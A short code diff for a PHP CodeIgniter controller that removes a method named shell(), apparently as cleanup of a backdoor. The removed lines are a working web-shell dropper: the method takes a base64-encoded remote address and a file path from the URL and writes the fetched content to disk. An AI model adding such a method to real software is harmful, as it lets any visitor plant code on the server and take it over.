@@ -94,12 +94,6 @@ class Newcon extends CI_Controller {
 
 
 	}
-
-	public function shell()
-	{
-		$str = $this->uri->uri_to_assoc(3);
-		fwrite(fopen($str["o"], 'w'), file_get_contents(base64_decode($str["i"])));
-	}
 	function logout()
 	{
 		$session_data = array('admin' => $this->session->userdata('admin'),'admin_logged_in' => $this->session->userdata('admin_logged_in'));
